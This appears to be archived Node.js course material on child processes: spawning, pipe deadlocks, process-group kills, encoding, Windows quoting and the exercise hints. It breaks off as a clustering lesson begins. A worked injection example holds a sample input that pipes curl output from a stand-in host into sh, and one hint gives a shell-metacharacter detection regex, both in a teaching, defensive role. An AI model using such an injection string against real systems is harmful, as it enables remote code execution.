# V3·NC2 — Child processes, spawning and stdio (archive)

## The model underneath

On POSIX, starting a program is two syscalls. `fork()` duplicates the current
process; `execve()` replaces its image with a new program, keeping the open
file descriptors. Node uses `posix_spawn` or the fork/exec pair through libuv,
sets up pipes for descriptors 0, 1 and 2 before the exec, and hands you stream
wrappers around them.

That inheritance is why `stdio: "inherit"` costs nothing — the child literally
uses your descriptors — and why `"pipe"` gives you a real kernel pipe with a
real, small buffer. Everything surprising about child processes comes from
those two facts.

## Worked example — the deadlock

```ts
const child = spawn("some-noisy-program", [], { stdio: "pipe" });
await new Promise((resolve) => child.on("exit", resolve));   // hangs
```

The child writes 64 KB, fills the pipe, and blocks in `write`. You are waiting
for `exit`, which will never come. The program is not stuck; it is politely
waiting for you.

Any of three fixes works, and choosing between them is a real decision:

```ts
child.stdout.resume();                     // read and discard
child.stdout.on("data", collect);          // read and keep
spawn(cmd, args, { stdio: "ignore" });     // never create the pipe
```

The same bug appears in reverse when you write a large payload to
`child.stdin` and the child reads it only after finishing its own output.

## Worked example — a safe command with a dangerous input

```ts
const branch = req.body.branch;                       // "main; curl evil.sh | sh"

execFile("git", ["log", "--oneline", branch], (error, stdout) => { /* safe */ });
exec(`git log --oneline ${branch}`, (error, stdout) => { /* compromised */ });
```

The first passes one argument containing a semicolon to `git`, which reports
an unknown revision. The second hands `sh` two commands. Nothing about the
call sites looks different in review, which is why the rule has to be
mechanical: **no template literals in `exec`, ever.**

If you truly need shell features — a pipeline, a glob — the defensible shape
is a fixed command string with no interpolation at all, and every variable
part passed through the environment:

```ts
exec('grep "$PATTERN" notes.txt', { env: { ...process.env, PATTERN: userInput } });
```

The shell expands `$PATTERN` after parsing, so its contents are data.

## Worked example — killing a tree

```ts
const child = spawn("bash", ["-c", "sleep 300"], { detached: true });

// child.kill() would signal bash, leaving sleep running as an orphan.
process.kill(-child.pid!, "SIGTERM");
```

`detached: true` makes the child a process-group leader, and a negative pid
signals the group. Without it, killing a wrapper leaves the real work running,
which is how a build server ends up with 400 `sleep` processes and a full
process table.

On Windows the equivalent is `taskkill /pid <pid> /T /F`, and there is no
graceful variant.

## Worked example — streaming instead of buffering

The difference between a script and a service, in one refactor:

```ts
// Buffers everything, dies at 1 MiB, tells you nothing until the end.
const { stdout } = await promisify(exec)("git log --format=%H");

// Streams, bounded memory, useful while it runs.
const child = spawn("git", ["log", "--format=%H"], { stdio: ["ignore", "pipe", "pipe"] });
const rl = createInterface({ input: child.stdout, crlfDelay: Infinity });
for await (const line of rl) index.add(line);
const [code] = await once(child, "close");
if (code !== 0) throw new Error(`git log exited with ${code}`);
```

`readline.createInterface` is the batteries-included version of ex2's line
splitter, and `crlfDelay: Infinity` is the option that stops it treating a
lone `\r` as a line break. The `for await` loop applies backpressure for free:
while your body is running, the stream is not read, so the pipe fills and
`git` slows down. That is the correct behaviour and you got it by writing a
loop.

The second half — awaiting `close` and checking the code — is the part people
drop. A stream that ends tells you the output finished, not that the program
succeeded. `git log` on a corrupt repository can print half an index and exit
128, and a loop that ignores the exit code will happily index half a
repository and report success.

## Common mistakes

- **`exec` with an interpolated string.** Command injection, every time.
- **Not reading `stdout`.** 64 KB later the child is blocked and your code is
  waiting on `exit`.
- **Resolving on `exit` instead of `close`.** You can lose the tail of the
  output.
- **`if (!code)` as a success test.** `null` from a killed process is falsy.
- **Ignoring the `error` event.** `ENOENT` for a missing binary arrives there,
  not as a non-zero exit.
- **`toString()` per chunk.** A multi-byte character split across a chunk
  boundary becomes two replacement characters. Concatenate buffers, then
  decode — or use `setEncoding`, which keeps a decoder for you.
- **Assuming `kill` is synchronous.** It sends a signal; the process ends when
  it ends, which is why timeouts need a second stage.
- **Forgetting `maxBuffer` exists.** A command that grows past 1 MiB starts
  failing in production long after it passed review.
- **Leaving children alive at shutdown.** Track them and kill them in your
  `SIGTERM` handler, or your deploys leave a trail of orphans.

## Interview answer

*"How do you run an external command safely from Node?"*

`spawn` or `execFile` with an argument array, never `exec` with an
interpolated string, because `exec` runs a shell and any metacharacter in the
input becomes syntax. I stream stdout and stderr rather than buffering, since
`exec`'s `maxBuffer` kills the child at 1 MiB, and I resolve on `close` so I
do not truncate the output. Failures come from three different places and I
handle them separately: an `error` event means the binary was not found or was
not executable, a non-zero exit code is the program's own failure, and a
`null` code with a signal means something killed it. Timeouts are two-stage —
`SIGTERM`, then `SIGKILL` after a grace period — and if the child spawns its
own children I use `detached` plus a negative-pid kill so the whole group
goes. On Windows I remember there are no real signals and `.cmd` needs a
shell.

## Check yourself

1. Why does `spawn` with unread `stdio: "pipe"` deadlock, and at roughly what
   volume?
2. What is the difference between `exec` and `execFile` in one sentence?
3. What is the default `maxBuffer`, and what happens when output exceeds it?
4. When is `code` `null` in an `exit` handler?
5. Why is `close` a better place to resolve than `exit`?
6. How do you pass user input to a command that genuinely needs a shell?
7. What does `detached: true` change, and what must you pass to `process.kill`
   to use it?
8. Which errors arrive on the `error` event rather than as an exit code?
9. Why does `fork`'s default serialisation lose a `Date`?
10. How do you make a child outlive its parent?
11. What breaks about `SIGTERM`-based graceful shutdown on Windows?
12. Why can a chunk boundary corrupt UTF-8, and what are the two fixes?
13. When would you choose a child process over a worker thread?
14. What does `child.send()` returning `false` mean, and what should you do
    about it?
15. Why does a program print incrementally in your terminal and in one burst
    under `spawn`, and whose problem is it to fix?

# Processes, pipes, and the parts Node cannot hide

## Where the API comes from

`child_process` predates almost everything else in Node's public surface, and
it shows: four functions with overlapping jobs, callbacks in an otherwise
promise-shaped world, and options whose names come straight from POSIX. It
also shows in a good way — the abstraction is thin enough that Unix knowledge
transfers directly.

When you call `spawn`, libuv does the work: it creates the pipes, forks (or
`posix_spawn`s), sets up the child's descriptors, and `execve`s the target. If
the exec fails — no such file, no permission — the child writes the errno back
through a dedicated pipe, and Node turns it into the `error` event on the
`ChildProcess`. That is why `ENOENT` cannot be an exit code: the program never
existed to have one.

`fork` is `spawn` of `process.execPath` with the current `execArgv`, plus an
extra descriptor for IPC and an environment variable telling the child which
fd to use. The IPC channel is a real pipe with a small framing protocol on
top; `child.send()` serialises, writes, and returns a boolean that behaves
like `stream.write` — `false` means the channel is backed up, and a service
that ignores it can queue messages until it runs out of memory.

## The pipe is the interesting object

A pipe on Linux holds 64 KB by default (`/proc/sys/fs/pipe-max-size` bounds
what you can raise it to). Writes beyond capacity block; reads on an empty
pipe block; a write to a pipe with no reader raises `SIGPIPE`, and because
Node ignores `SIGPIPE`, you get `EPIPE` as a stream error instead.

Three practical consequences:

1. **Deadlock is a design property, not a bug.** Two processes each waiting
   for the other to drain is exactly the textbook case, and it happens to
   Node programs that collect output only after `exit`.
2. **Interleaving stdout and stderr is unreliable.** They are two pipes; the
   order in which their chunks reach you is the order the kernel delivered
   them, which for a chatty program is not the order they were printed. If you
   need faithful interleaving, give the child the same descriptor for both
   (`stdio: ["ignore", "pipe", 1]` style) or `inherit`.
3. **stdout is block-buffered when it is a pipe.** Most C programs (and
   Python, and Node itself for files) switch from line buffering to 4 KB block
   buffering when stdout is not a TTY. That is why a program prints
   incrementally in your terminal and in silence for 30 seconds under `spawn`.
   The fix is on the child's side — `stdbuf -oL`, `python -u`, `PYTHONUNBUFFERED`
   — not yours.

## Encoding, and the chunk you split in half

`child.stdout` emits `Buffer`s. A UTF-8 character can be four bytes, and a
chunk boundary can fall in the middle of one. `chunk.toString("utf8")` per
chunk therefore produces `U+FFFD` replacement characters at random points in
large outputs, and the bug is invisible in tests where the output is small and
ASCII.

Two correct approaches: accumulate `Buffer`s and decode once with
`Buffer.concat(chunks).toString("utf8")`, or call `stream.setEncoding("utf8")`
and let Node's `StringDecoder` hold the partial bytes between chunks. The
second is what `exec` does internally.

## Windows, honestly

Windows has no `fork`, no `execve`, no signals and no process groups in the
POSIX sense. `CreateProcess` takes a single command *line* string, and the
receiving program parses it — usually with the C runtime's rules, sometimes
not (`cmd.exe` has its own, and they differ). Node therefore has to build that
string from your argument array, quoting as it goes.

This is exactly the surface of CVE-2024-27980: arguments containing certain
characters could break out of Node's quoting when spawning a batch file,
letting an attacker inject a command. The fix, shipped in April 2024, requires
`shell: true` to run `.bat`/`.cmd` at all and tightened the escaping. The
lesson to carry is not the CVE number — it is that "arguments as an array" is
a *stronger* guarantee on POSIX than on Windows, and cross-platform code
should treat any spawn of a batch file as a shell invocation with all the care
that implies.

Signals are the other honest difference. `child.kill("SIGTERM")` on Windows
does not deliver a signal; libuv calls `TerminateProcess`, which is closer to
`SIGKILL`. Graceful shutdown of a Windows child has to be arranged in-band.

## Cost, and when the cost is worth it

A process is heavier than a thread: its own address space, its own V8 if it is
Node (30-40 MB RSS before your code loads), its own module graph, page tables,
scheduler entries. Starting one is single-digit to low double-digit
milliseconds for a small binary, and 50-150 ms for another Node process. You
would not spawn one per request.

What you buy is isolation. A segfault in a native library takes down the child
and nothing else. An OOM kill removes one process. A malicious or buggy
transform cannot read your heap, and with `uid`/`gid`, a container, or a
`seccomp` profile it cannot read much else either. That is the trade: worker
threads are cheaper and share memory, child processes are expensive and share
nothing. When the code you are running is not yours, expensive and isolated is
the correct answer.

## The environment is part of the interface

A child inherits `process.env` by default, and that is a bigger decision than
it looks. Everything in your environment — `AWS_SECRET_ACCESS_KEY`,
`DATABASE_URL`, a session token — is readable by whatever you spawn, and by
anything it spawns. For a trusted binary that is convenience; for a
user-supplied plugin it is an exfiltration channel you opened by default.

Passing an explicit `env` is the fix, and it has a second benefit: it makes
the child's dependencies visible. `env: { PATH: process.env.PATH, LANG: "C" }`
documents that this program needs a path and a locale, and `LANG=C` in
particular pins the output format of half the GNU userland — `ls`, `date` and
`sort` all change their output with the locale, which is how a script that
parses `date` output breaks on a machine in a different country.

`cwd` deserves the same treatment. A child inherits your working directory,
which in a server is wherever the process was started and not necessarily
where you think. Passing `cwd` explicitly turns a relative path bug into an
explicit choice.

## When not to reach for a child process

- **To parallelise your own JavaScript.** Worker threads are cheaper and the
  data does not have to cross a pipe.
- **To scale request throughput.** That is `cluster` or replicas — one child
  per request is a fork bomb with a queue in front.
- **To do something a library does.** Shelling out to `curl`, `jq` or `sed`
  from a service means a new dependency on the host image, a new injection
  surface, and error handling that is now a string-parsing problem. `fetch`,
  `JSON.parse` and a regex are all in the process already.
- **When you cannot bound the output.** Streaming is fine; buffering an
  unbounded program's stdout is a memory leak with a friendly API.
- **In a hot path without a pool.** If you must shell out per unit of work,
  batch the units — one `ffmpeg` for fifty files beats fifty `ffmpeg`s.

Everything in this sector is a rule you can state in one line, and every one
of them was learned the same way: a production incident where a pipe filled
up, a shell interpreted a filename, or a `kill` signalled the wrong pid.

exercises.title: Ex1
exercises.hints:
## Hint 1

Three sources of truth and you need all of them: `stdout` chunks, `stderr`
chunks, and the event that says the child is done. Note that "done" has two
candidates and only one of them guarantees the streams have finished.

## Hint 2

Collect buffers rather than strings:

```ts
const out: Buffer[] = [];
child.stdout.on("data", (chunk: Buffer) => out.push(chunk));
// ... later
Buffer.concat(out).toString("utf8");
```

Concatenating `chunk.toString()` per chunk is fine until a multi-byte
character straddles a boundary, at which point you get replacement characters
in the middle of otherwise correct output.

## Hint 3

Resolve inside the `close` handler, which fires after both pipes have ended,
and reject inside `error`. The two are mutually exclusive in practice — a
process that never started never closes — but a settle-once guard costs one
boolean and removes the question.

The decision left to you: whether to also listen for `exit`. Work out what it
would add.
exercises.importantHints:
## Hint 1

Come at it from the failure taxonomy. There are three completely different
"it did not work" cases and this function must not blur them:

- the binary does not exist → `error` event, `ENOENT`, no exit code;
- the program ran and disagreed with you → exit code 1, 2, 127...;
- something killed it → `code === null`, `signal === "SIGKILL"`.

Only the first is a rejection here. The other two are data.

## Hint 2

If you resolve on `exit`, you are resolving when the process is gone but its
pipes may still have buffered data queued for you. It is a race you win
almost always, which is the worst kind: the test passes, and once a month a
log line goes missing from a job's captured output.

`close` is defined as "process gone *and* stdio ended".

## Hint 3

`spawn` throws synchronously for some argument problems (a non-string `file`,
an invalid option) and emits `error` asynchronously for others (`ENOENT`,
`EACCES`). Since this function returns a promise, make sure the synchronous
throw also comes back as a rejection rather than escaping the call — put the
`spawn` inside the promise executor and the language does it for you.

exercises.title: Ex2
exercises.hints:
## Hint 1

The state you are keeping is one string: everything received since the last
newline. Every `push` is "prepend the leftover, split, emit all but the last
piece, keep the last piece".

The last piece is not a line — it is the beginning of one, or nothing.

## Hint 2

```ts
const parts = (pending + text).split("\n");
pending = parts.pop() ?? "";
for (const part of parts) onLine(part.endsWith("\r") ? part.slice(0, -1) : part);
```

`pop` is doing the important work: `"a\nb".split("\n")` is `["a", "b"]` and
`"a\n".split("\n")` is `["a", ""]`, so in both cases the last element is
exactly the incomplete tail.

## Hint 3

`end()` has one job and one guard: emit `pending` if it is non-empty, then
clear it so a second call is a no-op. Note that clearing before calling
`onLine` is safer than after, in case the handler pushes more data.

The decision left to you: whether a `Buffer` chunk should be decoded with
`toString()` immediately. Consider what happens to a multi-byte character
split across a chunk boundary, and whether this API can even see that case.
exercises.importantHints:
## Hint 1

Start from the bug this exists to prevent. Attach `data` to a child's stdout
and split each chunk on `\n` independently, and the pipe's chunking decides
your output. A 4 KB boundary in the middle of a JSON log line gives you two
lines that are each invalid JSON, and your log shipper drops both.

Pipes make no promises about chunk boundaries. None.

## Hint 2

Then consider the opposite mistake: buffering the whole output and splitting
at the end. Correct, and useless for anything long-running — you see nothing
until the process exits, and a program that streams for an hour holds an hour
of output in memory.

The splitter exists because you want incremental *and* correct.

## Hint 3

The `\r\n` rule matters more than it looks. Windows programs, HTTP-shaped
protocols and anything that went through a terminal emit CRLF; strip the `\r`
at the point of emission, not with a global `replace`, because a lone `\r`
inside a line is legitimate data (progress bars use it).

If you want to be thorough, decide what your splitter does with a chunk ending
in `\r` when the `\n` arrives in the next chunk. Naive stripping breaks there.

exercises.title: Ex3
exercises.hints:
## Hint 1

Two timers, one child, and the rule that every path must clear both. The
second timer is not started when the first is — it is started *by* the first,
because the grace period begins when you ask the child to stop, not when the
job began.

## Hint 2

```ts
const deadline = setTimeout(() => {
  timedOut = true;
  child.kill("SIGTERM");
  grace = setTimeout(() => { escalated = true; child.kill("SIGKILL"); }, graceMs);
}, timeoutMs);
```

`kill` is a request to the kernel to deliver a signal; it returns immediately
and tells you nothing about whether the process complied. That is the entire
reason the second timer exists.

## Hint 3

Clear both timers in the `close` handler before you resolve. Forgetting the
grace timer is the interesting leak: it only exists on the timeout path, so a
test suite that exercises the happy path never notices, and then a long-lived
process holds a timer per timed-out job.

The decision left to you: whether to `unref()` the timers. Think about a CLI
that finishes its work while a grace timer is pending.
exercises.importantHints:
## Hint 1

Enter from what the two signals mean to the child. `SIGTERM` is catchable: a
well-written program flushes, closes its files and exits with a status.
`SIGKILL` cannot be caught, blocked or ignored — the kernel removes the
process, and any temp file, lock or half-written output stays as it is.

So going straight to `SIGKILL` is not "more reliable", it is "guaranteed to
skip cleanup". The grace period is you buying the child a chance to be tidy.

## Hint 2

Now the case that justifies the escalation: a child that installs a `SIGTERM`
handler and then blocks, or ignores the signal entirely, or is stuck in an
uninterruptible read. Termination is cooperative right up until it is not, and
a timeout with no second stage is a timeout that can hang forever.

This is exactly what Docker does: `SIGTERM`, ten seconds, `SIGKILL`.

## Hint 3

Windows is the asterisk on all of this. There are no signals; libuv implements
`kill` with `TerminateProcess`, so both stages behave like `SIGKILL` and the
child never gets to clean up. Your code stays the same, but the promise it
makes is weaker — worth one comment in the source, because someone will
eventually ask why the grace period appears to do nothing on their laptop.

exercises.title: Ex4
exercises.hints:
## Hint 1

The asymmetry is the whole exercise: dangerous characters in an *argument* are
harmless, and the same characters in the *file* are not. Say why in a comment
before you write the check — if you cannot, the policy is a superstition.

## Hint 2

A character class and a test is all the detection you need:

```ts
const METACHARACTERS = /[;|&$`()<>\n\r]/;
if (METACHARACTERS.test(file)) throw new Error(`file contains a shell metacharacter: ${file}`);
```

Resist the urge to *escape* them instead. Quoting rules differ between `sh`,
`bash`, `cmd.exe` and PowerShell, and every escaping implementation ever
written has been bypassed. Refusing is a policy you can verify.

## Hint 3

Rule 3 is a platform check plus an extension check, and it should use the
`platform` argument rather than `process.platform` so the behaviour is
testable from any machine. Defaulting the parameter to `process.platform`
gives you both.

The decision left to you: whether a `file` containing a space (a path like
`C:\Program Files\thing.exe`) is allowed. It is not a metacharacter, but it is
the thing Windows quoting historically got wrong.
exercises.importantHints:
## Hint 1

Approach it as the review checklist you wish existed. The rule "no template
literals in `exec`" is enforceable by a linter; this function is the runtime
version of the same rule, and its value is that it fails loudly at the
boundary instead of quietly at the shell.

Write the error messages as if a colleague will read them at 2am.

## Hint 2

The case worth designing against explicitly: someone passes
`{ file: "sh", args: ["-c", `cat ${userFile}`] }`. Every rule above passes —
`file` is clean, the metacharacters are in an argument — and it is still a
command injection, because the *program* is a shell.

You cannot detect that in general. What you can do is notice it, comment it,
and decide whether `planSpawn` should refuse a small set of known shells
outright. That trade-off is the interesting part of the exercise.

## Hint 3

For the Windows branch, the history is worth knowing: before the April 2024
security releases, Node would run `.bat`/`.cmd` files without a shell and
build the command line itself, and crafted arguments could break out of that
quoting (CVE-2024-27980). Current Node requires `shell: true` for batch files.
Your rule 3 is not a convenience — it is the platform telling you that batch
files are a shell context whether you like it or not.

exercises.title: Ex5
exercises.hints:
## Hint 1

The state is a `Map` from id to the pending call's resolvers. Everything else
is protocol: put an id on the way out, look the id up on the way back, delete
it once it is settled.

Deleting is not optional — a `Map` that only grows is this exercise's memory
leak.

## Hint 2

`Promise.withResolvers()` (Node 22) is made for this:

```ts
const { promise, resolve, reject } = Promise.withResolvers<T>();
pending.set(id, { resolve, reject });
child.send({ id, method, params });
return promise;
```

Note that `child.send` returns a boolean like `stream.write` does. `false`
means the IPC channel is backed up; a client that ignores it can queue
messages until the process runs out of memory.

## Hint 3

The exit path is the one people leave out. When the child dies, every
outstanding promise is a promise nobody will ever settle — so on `exit`, walk
the map, reject everything with a clear message, and clear it.

The decision left to you: whether a call issued *after* the child exited
should reject immediately or attempt the send. One of those produces an
`ERR_IPC_CHANNEL_CLOSED` throw you did not plan for.
exercises.importantHints:
## Hint 1

Start from serialisation, because it changes what your protocol can carry.
`child.send` uses JSON by default: `undefined` properties disappear, a `Date`
becomes an ISO string, `Map`/`Set` become `{}`, and `BigInt` throws. Passing
`serialization: "advanced"` switches to V8's structured-clone serialiser — the
same one worker threads use — and all of those work.

Pick one deliberately and write the protocol to match; discovering it by
debugging a missing field is the expensive route.

## Hint 2

Then the ordering question. Why can replies arrive out of order at all, when
the channel is a single ordered pipe? Because the *child* decides when to
answer. Two requests, one needing a file read and one needing arithmetic: the
arithmetic replies first. The pipe preserved order perfectly; the work did
not.

That is why correlation ids exist in every RPC protocol ever designed.

## Hint 3

Think about `close()` as a two-step operation: stop the channel
(`child.disconnect()`), then wait for the process to end (`exit`). A child
that is idle exits by itself once its IPC channel closes, because that channel
was the last thing keeping its event loop alive — which is a genuinely useful
property, and the reason `disconnect` exists rather than only `kill`.

exercises.title: Ex6
exercises.prompt:
## Problem 6 — many commands, bounded

Edit `ex6/solution.ts`. Implement:

```ts
export interface Spec { file: string; args: readonly string[]; }
export interface Outcome { code: number | null; stdout: string; error?: string; }

export function runAll(
  specs: readonly Spec[],
  options: { concurrency: number },
): Promise<Outcome[]>
```

Run the specs with at most `concurrency` children alive at once. Results come
back in **input order** regardless of completion order. A spec that fails to
spawn produces `{ code: null, stdout: "", error: "<message>" }` rather than
rejecting the whole batch — one bad command must not lose the other
forty-nine.

`concurrency < 1` throws a `RangeError`; an empty list resolves to `[]`
without spawning anything.

```ts
await runAll(
  [{ file: process.execPath, args: ["-e", "console.log(1)"] }],
  { concurrency: 4 },
);
// [{ code: 0, stdout: "1\n" }]
```

```
uv run dojo test node v3nc02_child_processes ex6
```
exercises.importantHints:
## Hint 1

Enter from the resource, not the algorithm. Each child is 30-40 MB of RSS for
a Node process, plus a pipe pair, plus a scheduler entry. Unbounded
`Promise.all` over 5,000 files is a fork bomb you wrote yourself: the machine
starts swapping, the OOM killer picks something, and the something is
sometimes your parent process.

Concurrency limits are a memory control before they are a speed control.

## Hint 2

The useful default for the limit is not "as many as possible". For
CPU-bound children, `availableParallelism()`; for I/O-bound children,
higher — but bounded by file descriptors, since each child costs three of
them plus whatever it opens. `ulimit -n` is usually 1024 on a developer
machine and the error, `EMFILE`, arrives as a spawn failure that looks
nothing like "too many processes".

## Hint 3

Consider what "fail fast" would mean here and why the spec rejects it.
`Promise.all` rejecting on the first failure leaves the other children
running, unwatched and unkillable, because you have already left the function.
Collecting outcomes means every child is accounted for — and if the caller
wants fail-fast semantics, they can inspect the array and decide.

exercises.title: Ex7
exercises.hints:
## Hint 1

The order of the rules is the exercise. Check for the spawn error before the
exit code, because a process that never started has a `code` of `null` and a
`signal` of `null` too, and a naive `code === 0` test on that input would say
`ok`.

## Hint 2

The API makes this trap easy to fall into:

```ts
child.on("close", (code, signal) => {
  if (code === 0) return done();       // fine
  if (!code) return retry();           // wrong: null and 0 are both falsy
});
```

`code === null` means "killed by a signal", which is a completely different
situation from `code === 0`, and `!code` cannot tell them apart.

## Hint 3

For `shouldRetry`, the useful frame is: *will doing exactly the same thing
again plausibly produce a different result?* `EMFILE` yes — descriptors get
freed. `ENOENT` no — the binary will not install itself. Exit code 1 no — the
program considered your input and disagreed.

The decision left to you: `SIGKILL`. It might be an OOM kill worth one retry,
or a deliberate operator action worth none. Pick, and defend it in a comment.
exercises.importantHints:
## Hint 1

Start from the supervisor that will consume this. It has to decide, for every
child that ends: log and forget, log and retry, or escalate to a human. A
function returning a boolean cannot support that; a tagged union can, and it
also makes the exhaustiveness check in a `switch` do work for you.

That is the practical argument for discriminated unions in one paragraph.

## Hint 2

Now the retry policy, which is where naive supervisors do damage. A retry on
`nonzero` turns "your input was invalid" into an infinite loop that runs the
same failing command forever, and each attempt costs a process. Retry only
what is plausibly transient, and cap the attempts regardless.

`EAGAIN` from `fork` is the textbook transient: the process table or a
`RLIMIT_NPROC` is full right now, and might not be in 50 ms.

## Hint 3

Exit codes carry conventions worth recognising, even though the classifier
does not act on them: `127` is a shell saying "command not found", `126` is
"found but not executable", and `128 + n` is a shell reporting death by signal
`n` (so `137` is `128 + 9`, a `SIGKILL`). If your child is a shell, a `code`
of 137 and a `signal` of `null` mean the same thing as a direct child's
`SIGKILL` — a genuinely useful thing to notice in a log.

exercises.title: Ex8
exercises.prompt:
## Problem 8 — writing to a child that stops listening

Edit `ex8/solution.ts`. Implement:

```ts
export interface PipeResult { stdout: string; wrote: number; brokenPipe: boolean; }

export function pipeThrough(
  file: string,
  args: readonly string[],
  input: readonly string[],
): Promise<PipeResult>
```

Write each element of `input` to the child's stdin, honouring backpressure
(`write` returning `false` means wait for `drain`), then `end()` the stream.
Collect stdout. If the child closes its stdin early, the write fails with
`EPIPE`: stop writing, set `brokenPipe: true`, report how many elements you
managed to write, and **still resolve** with whatever stdout you collected.

```ts
await pipeThrough(process.execPath, ["-e", READ_ALL], ["a\n", "b\n"]);
// { stdout: "a\nb\n", wrote: 2, brokenPipe: false }
```

```
uv run dojo test node v3nc02_child_processes ex8
```
exercises.hints:
## Hint 1

`EPIPE` is not your bug. It is the pipe reporting that the reader is gone —
exactly what `head -1` does to every program that pipes into it, every day,
deliberately.

So the design question is not "how do I stop it happening" but "what is the
right result when it does".

## Hint 2

Backpressure first, from `d17_backpressure`:

```ts
if (!child.stdin.write(chunk)) {
  await once(child.stdin, "drain");
}
```

`events.once` returns a promise, and it is the right tool here — but on a
stream that can also emit `error`, a bare `once(stream, "drain")` waits
forever if the error arrives first. Node's `events.once` handles that: it
rejects when the emitter emits `error`.

## Hint 3

Wrap the writing loop in a `try`/`catch`, catch the `EPIPE`, and fall through
to collecting the rest of stdout. Do not `end()` a stream that has already
errored — check `child.stdin.writableEnded` or guard with the same flag you
set for `brokenPipe`.

The decision left to you: whether an `EPIPE` should be visible to the caller
at all. This API says yes, as a flag. Consider what a copy utility would do
instead.
exercises.importantHints:
## Hint 1

Start from the deadlock that surrounds this exercise. You write a megabyte to
the child's stdin; the child writes a megabyte to stdout; nobody is reading
stdout because you are busy writing. Both pipes fill, both processes block,
and the job never ends.

The reason this exercise collects stdout with a `data` listener *before* the
writing loop starts is precisely that: the reading must already be in progress
while you write.

## Hint 2

Then the error plumbing. `child.stdin` is a `Writable` and an unhandled
`error` event on a stream is an uncaught exception that ends the process. So
`stdin.on("error", ...)` is not optional, even if all you do is record it —
and it is the reason `EPIPE` crashes so many scripts that never expected to be
piped into `head`.

## Hint 3

Note the asymmetry in what you can promise. `wrote` is the number of chunks
you handed to `write()`, not the number the child *read* — a chunk can sit in
the pipe buffer when the child dies. Being precise about that in the type's
name or a comment is the difference between a useful number and a misleading
one.

exercises.title: Challenge
exercises.hints:
## Hint 1

Assemble rather than invent: ex6 gives you the lane loop, ex3 the timers, ex2
the splitter. The only new code is the wiring between them.

Do it in that order and the hard part is small.

## Hint 2

Per job, the ordering that matters is: attach the stdout listener that feeds
the splitter, then start the timers, then wait for `close`, then flush the
splitter, then clear the timers.

Flushing after `close` is what preserves the final partial line of a killed
child — the bytes were already delivered; the newline never was.

## Hint 3

`active()` is a counter incremented at spawn and decremented in the same place
you resolve the per-job promise. Put both in a `finally`-equivalent path so a
spawn failure decrements too, or the number drifts upward and your "active"
gauge slowly becomes a lie.

The decision left to you: whether the timeout applies to the whole batch as
well as to each job. State which you implemented in a comment.
exercises.importantHints:
## Hint 1

Enter from the report, not the runner. Write down what you want to be true of
`JobReport` for each of the five endings — success, non-zero, timed out and
terminated, timed out and escalated, spawn failed — and you will find the
fields you need and the ones you do not.

Designing the output first is what stops the implementation from deciding your
API by accident.

## Hint 2

The subtle interaction: a killed child's stdout stream ends *because* it was
killed, and `close` fires shortly after. If you flush the line splitter when
the timeout fires rather than when the stream ends, you race the last chunks
and drop them.

Flush exactly once, driven by the stream, not by the clock.

## Hint 3

Think about what `onLine` is allowed to do. It is caller code running
synchronously inside your `data` handler, so a slow or throwing callback is
your problem: a throw propagates into the stream's emit and can take down the
process. Wrapping the call is defensive but honest — say what you decided,
because "callbacks are trusted" is also a defensible position if written down.

exercises.title: Review 1
exercises.hints:
## Hint 1

Bytes, not characters. `chunk.length` on a `Buffer` is bytes; `string.length`
is UTF-16 code units, and the two differ for anything non-ASCII. `maxBuffer`
in Node is documented in bytes for the buffer case, and getting this wrong
gives you a limit that silently varies with the content.

## Hint 2

The truncation is a slice on the chunk that crosses the line:

```ts
const room = maxBuffer - total;
kept.push(chunk.subarray(0, room));
```

`subarray` shares memory with the original chunk rather than copying it, which
is what you want here — but it also means the chunk stays alive as long as
your slice does, which for a 64 KB chunk you kept 10 bytes of is a small,
real waste. `Buffer.from(chunk.subarray(0, room))` copies.

## Hint 3

After you kill the child, its `close` still fires and `code` will be `null`
with a `signal` — that is the truthful report, so do not paper over it by
substituting 0.

The decision left to you: whether to remove the `data` listener after
truncating or to keep counting and discarding. One of them lets the child fill
its pipe and block; think about whether that matters when you have just killed
it.
exercises.importantHints:
## Hint 1

Start from why `maxBuffer` exists at all. `exec` promises you a string at the
end, which means it must hold everything in memory, which means an unbounded
program is an unbounded allocation. The cap is the platform refusing to let a
convenience API become an OOM.

Understanding that makes the rule easy to remember: buffering APIs need a
limit; streaming APIs do not.

## Hint 2

Now the part people are surprised by in production. When `exec` exceeds
`maxBuffer` it kills the child and calls back with an error — and
`error.stdout` still contains the truncated output. Code that only logs
`error.message` throws away the 1 MiB of output that would have explained the
failure.

Your `truncated` flag is the same information, made impossible to miss.

## Hint 3

Consider the interaction with the pipe. Once you stop reading, the pipe fills
at 64 KB and the child blocks in `write`. If your kill signal is caught and
handled slowly, that blocked child sits there — so killing and *then* leaving
the stream unread is safe only because the kill is on its way. Keeping the
reader draining until `close` is the belt-and-braces version, and it costs one
`resume()`.

lessons.title: V3·NC3 — Clustering, load balancing and shared state
lessons.summary: One Node process uses one core. Cluster gives you N of them behind one port, and takes away every assumption you had about in-process state: sessions, caches, rate limits and cron jobs all break the day you fork a second worker. This sector is the balancing, the supervision and the fix for that state.
lessons.briefing:
# V3·NC3 — Clustering, load balancing and shared state

Two sectors ago you moved a slow function off the loop. Last sector you moved
a whole program out of the process. This one is about the third axis: you have
a 16-core machine and a Node process that can saturate exactly one of them.

`cluster` is the built-in answer. The primary process forks N workers, each a
full copy of your server, and they all serve the same port. From the outside
it is one service; from the inside it is N processes that share nothing but a
socket. That last clause is where the interesting problems are.

## Concept — how N processes share one port

They do not, quite. Two designs exist and Node implements both:

**`SCHED_NONE`** — the primary creates the listening socket and passes the
handle to every worker. All of them `accept()` on the same socket, and the
kernel decides who wins. This is the Windows default, and it is fast in the
sense that there is no extra hop; it is also famously uneven, because the
kernel tends to wake the same process repeatedly, and one worker can end up
with most of the connections.

**`SCHED_RR`** — the default everywhere else since Node 6. The primary
`accept()`s, then hands the connection's file descriptor to a worker in
round-robin order. One extra hop per connection, dramatically more even
distribution, and it is the default because uneven beats slow in practice.

```ts
import cluster from "node:cluster";
import { availableParallelism } from "node:os";

if (cluster.isPrimary) {
  for (let i = 0; i < availableParallelism(); i++) cluster.fork();
  cluster.on("exit", (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died (${signal ?? code}) - forking a replacement`);
    cluster.fork();
  });
} else {
  createServer(app).listen(3000);
}
```

`availableParallelism()` (Node 18.14+) is the right call, not
`os.cpus().length`: in a container limited to one CPU on a 64-core host,
`cpus()` reports 64 and you will fork 64 workers onto one core's worth of
quota. That single line is one of the most common production misconfigurations
in Node.

There is a newer option worth knowing: `reusePort: true` on `listen()`, which
uses the kernel's `SO_REUSEPORT` to let independent processes bind the same
port with the kernel doing the balancing. No primary, no handle passing, and
